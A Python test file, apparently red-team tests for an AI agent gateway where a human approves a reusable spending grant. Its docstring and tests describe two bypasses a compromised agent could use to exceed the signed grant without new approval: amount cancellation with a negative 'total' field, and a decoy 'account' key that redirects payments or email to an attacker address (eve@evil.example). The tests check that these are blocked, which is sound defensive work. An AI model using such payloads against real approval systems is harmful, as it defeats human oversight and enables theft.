"""RT-1 / RT-2 (P6 scope integrity, live gateway, asu mode, default policy).

The human approves "transfer_money 10 USD to bob-acct" and ticks "allow
similar" (grant: target=bob-acct, max_amount=10 USD, max_total=100 USD).
A compromised agent then gets effects OUTSIDE those signed constraints
executed under the grant, with no new passkey approval:

* RT-1 amount cancellation: ``amount=10000, total=-10000`` -> amount_of() sums
  the heuristic amount keys to 0, so the per-use and total caps see 0.
* RT-2 decoy target: ``payee=eve-acct, account=bob-acct`` -> _derive_target()
  takes the alphabetically-first account-typed key, so target=bob-acct.

These tests assert the SECURE behaviour: nothing beyond the signed grant
reaches the ledger.
"""
from __future__ import annotations

import os
import sys

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from rt_live import live  # noqa: E402,F401  (pytest fixture)


def _grant_for_bob(gw, human, agent):
    r = agent.call("transfer_money", {"payee": "bob-acct", "amount": "10", "currency": "USD"})
    assert r.status_code == 202, r.text
    aid = r.json()["approval_id"]
    view = human.view(aid)
    gr = view["grant_request"]
    assert gr["target"] == "bob-acct" and gr["max_amount"] == "10" and gr["currency"] == "USD"
    human.approve(aid, grant=True)
    assert agent.execute(aid).status_code == 200


def _executed_by_grant(gw):
    return [e for e in gw.ledger() if e["via"] == "grant"]


def test_grant_amount_cancellation_does_not_exceed_signed_cap(live):
    gw, human, agent = live
    _grant_for_bob(gw, human, agent)
    r = agent.call("transfer_money",
                   {"payee": "bob-acct", "amount": "10000", "total": "-10000", "currency": "USD"})
    over_cap = [e for e in _executed_by_grant(gw) if e["descriptor"]["args"].get("amount") == "10000"]
    assert not over_cap, (
        f"P6 broken: a 10000 USD transfer executed under a grant signed for max 10 USD "
        f"(HTTP {r.status_code} {r.text})")


def test_grant_decoy_account_key_does_not_redirect_payee(live):
    gw, human, agent = live
    _grant_for_bob(gw, human, agent)
    r = agent.call("transfer_money",
                   {"payee": "eve-acct", "account": "bob-acct", "amount": "5", "currency": "USD"})
    to_eve = [e for e in gw.ledger() if e["descriptor"]["args"].get("payee") == "eve-acct"]
    assert not to_eve, (
        f"P6 broken: payment to eve-acct executed under a grant signed for target bob-acct "
        f"(HTTP {r.status_code} {r.text}; via={[e['via'] for e in to_eve]})")


def test_grant_decoy_account_key_does_not_redirect_email(live):
    gw, human, agent = live
    r = agent.call("send_email", {"to": "bob@example.com", "subject": "s", "body": "b"})
    aid = r.json()["approval_id"]
    human.approve(aid, grant=True)
    assert agent.execute(aid).status_code == 200
    r = agent.call("send_email", {"to": "eve@evil.example", "account": "bob@example.com",
                                  "subject": "payroll", "body": "attached"})
    to_eve = [e for e in gw.ledger() if e["descriptor"]["args"].get("to") == "eve@evil.example"]
    assert not to_eve, (
        f"P6 broken: email to eve@evil.example executed under a grant for bob@example.com "
        f"(HTTP {r.status_code} {r.text})")
